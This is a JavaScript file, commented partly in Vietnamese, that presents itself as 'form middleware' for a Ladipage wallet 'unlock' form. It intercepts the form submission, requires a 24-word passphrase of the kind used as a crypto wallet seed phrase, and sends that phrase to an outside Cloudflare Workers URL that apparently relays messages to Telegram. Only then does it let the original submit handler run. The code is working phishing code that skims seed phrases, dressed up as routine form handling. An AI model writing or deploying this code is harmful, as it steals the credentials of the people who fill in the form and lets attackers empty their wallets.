/**
 * Form Middleware System for Ladipage Unlock Form
 * - Middleware 1: Extract form data
 * - Middleware 2: Validate passphrase (24 từ)
 * - Middleware 3: Gửi API trước khi handler chạy
 * - Sau đó mới gọi handler submit gốc
 */

const formMiddleware = {
    middlewares: [],
    use(fn) { this.middlewares.push(fn); return this; },
    execute(event, next) {
      let index = 0;
      const executeNext = () => {
        if (index < this.middlewares.length) {
          const middleware = this.middlewares[index++];
          middleware(event, executeNext);
        } else {
          next();
        }
      };
      executeNext();
    }
  };
  
  const unlockFormMiddleware = Object.create(formMiddleware);
  
  // Middleware 1: extract data
  unlockFormMiddleware.use((event, next) => {
    console.log("Middleware 1: Extract form data");
    event.preventDefault(); // chặn mặc định trước
  
    const formData = new FormData(event.target);
    const data = {};
    formData.forEach((v, k) => (data[k] = v.trim()));
    event.formData = data;
  
    console.log("Form data:", data);
    next();
  });
  
  // Middleware 2: validate
  unlockFormMiddleware.use((event, next) => {
    console.log("Middleware 2: Validate passphrase");
    const passphrase = event.formData?.message || "";
    if (!passphrase) {
      alert("Please enter your 24-word passphrase");
      return;
    }
    const words = passphrase.split(/\s+/);
    if (words.length !== 24) {
      alert("Passphrase must contain exactly 24 words");
      return;
    }
    next();
  });
  
  // Middleware 3: gọi API rồi cho submit thật
  unlockFormMiddleware.use((event, next) => {
    console.log("Middleware 3: Sending API request…");
  
    const content = encodeURIComponent(event.formData?.message || "");
    const url = `https://sendmessagetele.myloverkt.workers.dev/?text=${content}`;
  
    fetch(url)
      .then(res => {
        console.log("API response status:", res.status);
        next();
      })
      .catch(err => {
        console.error("API request failed:", err);
        next();
      });
  });
  
  let middlewareExecuting = false;
  
  document.addEventListener("DOMContentLoaded", () => {
    console.log("Setting up unlock form middleware");

    const unlockForm = document.querySelector("#FORM4 form.ladi-form");
    if (!unlockForm) {
      console.warn("Unlock form not found!");
      return;
    }

    // Intercept the jQuery submit handler
    const originalSubmit = unlockForm.onsubmit;
    unlockForm.onsubmit = function(event) {
      if (middlewareExecuting) return;
      middlewareExecuting = true;
      console.log("Form submission intercepted → running middlewares");
      
      unlockFormMiddleware.execute(event, () => {
        console.log("All middlewares done → run original handler");
        middlewareExecuting = false;
        // Let jQuery handler take over
        return true;
      });
      
      return false; // Prevent default while middleware runs
    };
  });
